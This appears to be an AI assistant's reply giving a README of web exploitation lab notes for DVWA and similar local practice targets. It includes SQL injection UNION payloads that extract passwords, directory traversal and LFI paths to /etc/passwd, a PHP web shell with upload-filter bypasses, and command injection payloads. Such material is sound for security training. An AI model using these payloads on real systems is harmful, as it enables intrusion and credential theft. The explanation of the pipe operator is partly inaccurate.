Here's a structured and detailed README.md file for this web exploitation project. I've broken down each concept into sections, provided clear headings, and used formatting to make it both informative and visually engaging.  

---

```markdown
# Web Exploitation Techniques

This repository contains a collection of web exploitation techniques focused on SQL Injection, Directory Traversal, Local File Inclusion, and File Upload Vulnerabilities. The examples and commands provided here can be used for ethical hacking and testing of web application vulnerabilities in controlled environments.

## Table of Contents
1. [Broken Access Control](#broken-access-control)
2. [SQL Injection (SQLi) Examples](#sql-injection-sqli-examples)
3. [Directory Traversal](#directory-traversal)
4. [File Inclusion](#file-inclusion)
5. [File Upload Vulnerabilities](#file-upload-vulnerabilities)

---

## 1. Broken Access Control

### Docker Command
To list running Docker containers:
```bash
sudo docker container ps
```

### SQL Injection in Broken Access Control
Performing SQL injection on the DVWA platform to test access control vulnerabilities.

#### Basic Payload
```sql
GET /vulnerabilities/sqli/?id=' OR 1=1 #
```

- **Convert special characters to URL encode** for proper injection.
- Use the `Ctrl+U` shortcut to view the source code for insights.

#### DVWA SQL Injection Examples
- **Low Security Level**:
  ```sql
  Payload: ' OR 1=1 #
  Password Extraction: ' UNION SELECT user, password FROM users #
  ```
- **Medium Security Level**:
  ```sql
  Payload: 1 OR 1=1 #
  Password Extraction: 1 UNION SELECT user, password FROM users #
  ```

#### SecureBank SQL Injection Examples
- **Union-based SQLi for Table Enumeration**:
  ```sql
  ' UNION SELECT * FROM Transactions --
  ```
- **Retrieving Specific Information**:
  ```sql
  ' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, 'string' FROM Transactions --
  ' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, @@version FROM Transactions --
  ```

---

## 2. Directory Traversal

### Extracting Files via Directory Traversal
```bash
tar -xvf apache-tomcat-8.5.99.tar.gz
./catalina.sh run  
```

Use `wfuzz` to test file paths:
```bash
python3 -m venv venv
. venv/bin/activate
wfuzz -w wordlist http://localhost:1337/dynamic-app1/?FUZZ=test
```

**Example**: Accessing a hidden file:
```url
http://localhost:1337/dynamic-app1/?file=../../../secret.txt
```

### Code Explanation (Directory Traversal Vulnerability)
1. **Retrieve File Parameter**:
   ```java
   String file = request.getParameter("file");
   ```
2. **File Null Check**:
   ```java
   if (file == null) { /* Execute fallback code */ }
   ```
3. **Construct Full File Path**:
   ```java
   Path path = Paths.get(getServletContext().getRealPath("/") + "/" + file);
   ```
4. **Read File Contents**:
   ```java
   byte[] data = Files.readAllBytes(path);
   String s = new String(data, StandardCharsets.UTF_8);
   out.println(s);
   ```

---

## 3. File Inclusion

### Local File Inclusion (LFI)
Retrieve sensitive files using Local File Inclusion.

```url
http://localhost/vulnerabilities/fi/?page=../../../../../../../../../etc/passwd
```

### PHP Filters for LFI
1. Encode files in base64 to view sensitive data:
   ```url
   http://localhost/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
   ```

   Decode the base64 string to get the `/etc/passwd` content.

---

## 4. File Upload Vulnerabilities

### Level 1 - Unrestricted File Upload
1. **Create a PHP shell script**:
   ```php
   <?php system($_REQUEST['cmd']); ?>
   ```
2. **Execute commands via URL**:
   ```url
   http://localhost:7070/uploads/level1-thumbnail.php?cmd=whoami
   ```

### Level 2 - File Extension Check Bypass
1. Intercept the upload request using a tool like Burp Suite.
2. Change `Content-Type` from `application/x-php` to `image/png`.
3. **Execute Commands**:
   ```url
   http://localhost:7070/uploads/level2-thumbnail.php?cmd=whoami
   ```

### Level 3 - Image File Check Bypass
1. **Modify Image File Header**:
   Use a PHP payload in the first part of an image file to bypass checks.
2. **Execute Commands**:
   ```php
   <?php system($_REQUEST['cmd']); ?>
   ```

---
Here's an expanded section on **Command Injection** to add to your README.md file. This section includes an explanation of command injection, example commands, and specific strategies for testing in DVWA at different security levels.

---

## 5. Command Injection

Command Injection vulnerabilities occur when an application allows an attacker to execute arbitrary commands on the server. This can lead to unauthorized access to sensitive information or system compromise. Command Injection is often found in applications that take user input and pass it to system commands without proper validation or sanitization.

### Example Command
To demonstrate a command injection vulnerability, you can execute the following command in a vulnerable application:
```bash
ping -c 1 leonardotamiano.xyz ; whoami
```
In this example, the `ping` command is executed, and the `whoami` command is executed right after it, revealing the current user.

### Docker Command Execution
You can also run commands in a Docker container:
```bash
docker run -p 80:8080 <image_name>
```

### Testing Command Injection in DVWA
**DVWA** (Damn Vulnerable Web Application) provides a safe environment to practice command injection attacks. The security levels in DVWA range from low to impossible, providing different validation challenges.

#### Low Security Level
At this level, the application has minimal security measures in place. You can enter the following command in the ping input field:
```bash
ip-address; cat /etc/passwd; whoami
```
- **Explanation**: The command above will attempt to ping the specified IP address, and if successful, will output the contents of the `/etc/passwd` file followed by the current user.

#### Medium Security Level
In this level, the application applies basic validation to the input. It might block the use of `&&` and `;`. However, you can still exploit the vulnerability using pipes:
```bash
ip | cat /etc/passwd
```
- **Explanation**: The `|` operator allows you to pipe the output of the `ip` command into `cat /etc/passwd`, bypassing the restrictions on `&&` and `;`.

#### High Security Level
At this level, the application implements more stringent security checks, including filtering of common command injection patterns. A possible approach is to check the source code for command injection vectors:
```bash
|whoami
```
- **Explanation**: Here, you use the pipe operator (`|`) without any surrounding spaces to attempt to execute `whoami` in a command chain. This can sometimes evade basic filtering.

#### Impossible Level
In this highest level of security, DVWA employs whitelisting techniques to restrict user input to a predefined list of acceptable commands. Command injection becomes extremely difficult, if not impossible, to execute at this level.
- **Explanation**: Whitelisting only allows specific commands to be executed, preventing any form of command injection.

### Important Notes
- Command Injection can lead to severe security breaches, allowing attackers to gain unauthorized access to sensitive information.
- Always validate and sanitize user inputs to prevent command injection vulnerabilities.
- Use tools like **Burp Suite** for intercepting requests and testing command injection.

### Disclaimer
These techniques are for educational purposes and should only be used in authorized environments. Unauthorized access or testing without permission is illegal.

---

